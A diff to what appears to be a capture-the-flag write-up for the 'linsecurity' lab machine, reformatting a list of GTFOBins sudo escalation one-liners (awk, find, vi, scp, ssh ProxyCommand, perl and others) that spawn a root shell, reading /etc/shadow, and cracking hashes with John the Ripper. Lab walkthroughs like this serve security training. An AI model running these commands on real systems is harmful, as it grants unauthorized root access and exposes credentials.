@@ -87,31 +87,30 @@ User bob may run the following commands on linsecurity:
 
 After found [gtfobins](https://gtfobins.github.io/), we'll try theses commands:
 
-+ ash : sudo ash
-+ awk : sudo awk 'BEGIN {system("/bin/sh")}'
-+ bash : sudo bash
-+ sh : sudo sh
-+ csh : sudo csh
-+ dash : sudo dash
-+ ed : sudo ed (**and after**) !/bin/sh
-+ env : sudo env /bin/sh
-+ expect : sudo expect -c 'spawn /bin/sh;interact'
-+ find : sudo find . -exec /bin/sh \; -quit
-+ ftp : sudo ftp (**and after**) !/bin/sh
-+ less : sudo less /etc/profile (**and after**) !/bin/sh
-+ man : sudo man man (**and after (in the man)**) !/bin/sh
-+ more : sudo more /etc/shadow (**and after**) !/bin/sh
-+ scp : TF=$(mktemp); echo 'sh 0<&2 1>&2' > $TF; chmod +x "$TF"; sudo scp -S $TF x y:
-+ socat : 
-+ ssh : sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
-+ vi : sudo vi -c ':!/bin/sh'
-+ zsh : sudo zsh
-+ pico : TERM=xterm; TF=$(mktemp); echo 'exec sh' > $TF; chmod +x $TF; sudo pico -s $TF /etc/hosts (**and after**) Ctrl+T
-+ rvim :  
-+ perl : sudo perl -e 'exec "/bin/sh";'
-+ tclsh : sudo tclsh (**and after**) exec /bin/sh <@stdin >@stdout 2>@stderr
-+ git : sudo git help status (**and after**) !/bin/sh 
-+ script : sudo script -c '/bin/sh'
++ ash : `sudo ash`
++ awk : `sudo awk 'BEGIN {system("/bin/sh")}'`
++ bash : `sudo bash`
++ sh : `sudo sh`
++ csh : `sudo csh`
++ dash : `sudo dash`
++ ed : `sudo ed` (**and after**) `!/bin/sh`
++ env : `sudo env /bin/sh`
++ expect : `sudo expect -c 'spawn /bin/sh;interact'`
++ find : `sudo find . -exec /bin/sh \; -quit`
++ ftp : `sudo ftp` (**and after**) `!/bin/sh`
++ less : `sudo less /etc/profile` (**and after**) `!/bin/sh`
++ man : `sudo man man` (**and after (in the man)**) `!/bin/sh`
++ more : `sudo more /etc/shadow` (**and after**) `!/bin/sh`
++ scp : `TF=$(mktemp); echo 'sh 0<&2 1>&2' > $TF; chmod +x "$TF"; sudo scp -S $TF x y:`
++ ssh : `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`
++ vi : `sudo vi -c ':!/bin/sh'`
++ zsh : `sudo zsh`
++ pico : `TERM=xterm; TF=$(mktemp); echo 'exec sh' > $TF; chmod +x $TF; sudo pico -s $TF /etc/hosts` (**and after**) `Ctrl+T`
++ rvim : no found
++ perl : `sudo perl -e 'exec "/bin/sh";'`
++ tclsh : `sudo tclsh (**and after**) exec /bin/sh <@stdin >@stdout 2>@stderr`
++ git : `sudo git help status` (**and after**) `!/bin/sh` 
++ script : `sudo script -c '/bin/sh'`
 
 Other commands who need more step:
 
@@ -145,9 +144,9 @@ And execute:
 
     $ sudo sh ./socat.sh
 
-Voila, we have run all commands.
+Voila, we have run all commands except `rvim`.
 
-The content bellow is not finished, i explore all other way :)
+The content bellow is not yet finished, i explore all other way.
 ---
  We can connect as bob and susan, return to bob and chec peter file:
 
@@ -195,6 +194,7 @@ PermitRootLogin yes
 Docker version 18.03.1-ce, build 9ee9f40
 -e
 ```
+
 I use `johntheripper` to crack the hash under `/etc/passwd`:
 
     $ vim shadow
